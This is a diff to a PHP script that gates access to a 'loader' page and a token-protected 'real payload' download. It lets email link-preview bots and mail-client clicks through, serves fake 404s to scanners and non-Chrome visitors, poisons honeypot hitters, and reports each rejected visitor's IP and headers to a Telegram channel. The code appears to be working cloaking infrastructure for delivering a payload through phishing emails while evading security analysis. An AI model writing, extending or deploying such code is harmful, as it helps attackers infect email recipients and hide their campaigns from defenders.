@@ -180,6 +180,17 @@ function mail_ref_host(string $host): bool {
     return false;
 }
 
+// Link-preview fetchers: mail services fetch the embedded URL server-side to
+// build the in-compose/inbox preview card, with a bot UA and no referer.
+// These must get a 200 (else the link shows "error 404" in the client), so
+// we serve them the entry page. The real payload still requires the token +
+// same-origin referer on steps 2-3, which a previewer can never produce.
+function is_mail_previewer(): bool {
+    $ua = ua();
+    if ($ua === '' || is_real_browser()) return false;
+    return (bool)preg_match('/googlebot|linkpreview|link-preview|y!path-discovery|msnbot|msnbocom|bingbot|twitterbot|whatsapp|facebookexternalhit|telegrambot|discordbot/i', $ua);
+}
+
 // Referer must be this host, previous page's path.
 function referer_ok(array $allowedPaths): bool {
     $ref = (string)($_SERVER['HTTP_REFERER'] ?? '');
@@ -261,25 +272,33 @@ function rate_allows(string $ip): bool {
 function gate_doc(array $allowedRefPaths, int $minAge, bool $requireUser): void {
     if (isset($_GET['hp'])) { poison_hit(); }
     if (is_poisoned()) silent_404();
-    // Arrivals from a mail client (Gmail/Yahoo/Outlook/…) — either the
-    // recipient clicking the embedded link or the mail service's own
-    // link-preview fetcher. Mail clients don't send the full desktop-Chrome
-    // fingerprint, so accept the referer as proof of legitimacy and serve
-    // the real page instead of the hard 404 the fingerprint gate would emit.
-    if (mail_ref_host(ref_host())) {
-        if ($allowedRefPaths !== []) {
+    $entry = ($allowedRefPaths === []);
+    // Entry-page arrivals that are NOT a full desktop-Chrome document nav:
+    //  - mail link-preview fetchers (bot UA, no referer) -> serve the page
+    //  - mail-client embed clicks that arrive cross-site with a mail referer
+    //  - a link-unwrap click that STRIPPED the referer (cross-site, no referer)
+    // For step pages we still verify token + min-age; the entry page just
+    // serves the loader (the real download needs the token + same-origin
+    // referer on the next hop, which these clients can't fake).
+    $mailArr = $entry
+        && (is_mail_previewer()
+            || mail_ref_host(ref_host())
+            || (ref_host() === '' && strtolower(req_header('Sec-Fetch-Site')) === 'cross-site'));
+    if ($mailArr) {
+        if (!$entry) {
             $tok = check_token($_GET['tk'] ?? null);
-            if (!$tok || time() - (int)$tok['t'] < $minAge) silent_404();
+            if (!$tok) silent_404();
+            if (time() - (int)$tok['t'] < (function_exists('verdict_min_age') ? verdict_min_age($tok, $minAge) : $minAge)) silent_404();
         }
         return;
     }
     if (!chrome_headers_ok()) silent_404();
     if (strtolower(req_header('Sec-Fetch-Dest')) !== 'document') silent_404();
     if ($requireUser && strtolower(req_header('Sec-Fetch-User')) !== '?1') silent_404();
-    if ($allowedRefPaths !== []) {
+    if (!$entry) {
         $tok = check_token($_GET['tk'] ?? null);
         if (!$tok) silent_404();
-        if (time() - (int)$tok['t'] < $minAge) silent_404();
+        if (time() - (int)$tok['t'] < (function_exists('verdict_min_age') ? verdict_min_age($tok, $minAge) : $minAge)) silent_404();
         if (!referer_ok($allowedRefPaths)) silent_404();
     }
 }
@@ -361,7 +380,41 @@ function geo(string $ip): array {
 }
 
 // -------------------------------------------------- silent 404
+function forensics_404(): void {
+    if (isset($_GET['hp'])) return;                 // scanners, not humans
+    $f = RATE_DIR . '/fs_' . md5(ip());
+    $now = time();
+    $last = (int)@file_get_contents($f);
+    if ($now - $last < 60) return;                  // 1 per IP per minute
+    @file_put_contents($f, (string)$now);
+    $h = function (string $k) { return req_header($k); };
+    $lines = [
+        '🔍 404-gate forensics',
+        'IP: ' . ip(),
+        'UA: ' . mb_substr(ua(), 0, 160),
+        'Path: ' . (string)($_SERVER['REQUEST_URI'] ?? ''),
+        'Host: ' . (string)($_SERVER['HTTP_HOST'] ?? ''),
+        'Referer: ' . (req_header('Referer') !== '' ? req_header('Referer') : '—'),
+        'Sec-Fetch-Site: ' . (req_header('Sec-Fetch-Site') !== '' ? req_header('Sec-Fetch-Site') : '—'),
+        'Sec-Fetch-Dest: ' . (req_header('Sec-Fetch-Dest') !== '' ? req_header('Sec-Fetch-Dest') : '—'),
+        'Sec-Fetch-Mode: ' . (req_header('Sec-Fetch-Mode') !== '' ? req_header('Sec-Fetch-Mode') : '—'),
+        'Sec-Fetch-User: ' . (req_header('Sec-Fetch-User') !== '' ? req_header('Sec-Fetch-User') : '—'),
+        'Sec-Ch-Ua: ' . mb_substr((string)$h('Sec-Ch-Ua'), 0, 120),
+        'Sec-Ch-Ua-Platform: ' . (req_header('Sec-Ch-Ua-Platform') !== '' ? req_header('Sec-Ch-Ua-Platform') : '—'),
+        'Sec-Ch-Ua-Mobile: ' . (req_header('Sec-Ch-Ua-Mobile') !== '' ? req_header('Sec-Ch-Ua-Mobile') : '—'),
+        'Upgrade-Insecure-Requests: ' . (req_header('Upgrade-Insecure-Requests') !== '' ? req_header('Upgrade-Insecure-Requests') : '—'),
+        'Accept: ' . mb_substr((string)$h('Accept'), 0, 80),
+        'Accept-Language: ' . (req_header('Accept-Language') !== '' ? req_header('Accept-Language') : '—'),
+        'XFF: ' . (req_header('X-Forwarded-For') !== '' ? req_header('X-Forwarded-For') : '—'),
+    ];
+    $lines = array_values(array_filter($lines, function ($l) {
+        return $l !== 'Path: ' && $l !== 'Host: ';
+    }));
+    tg(mb_substr(implode("\n", $lines), 0, 2900));
+}
+
 function silent_404(): void {
+    forensics_404();
     http_response_code(404);
     header('Content-Type: text/html; charset=utf-8');
     echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head>"
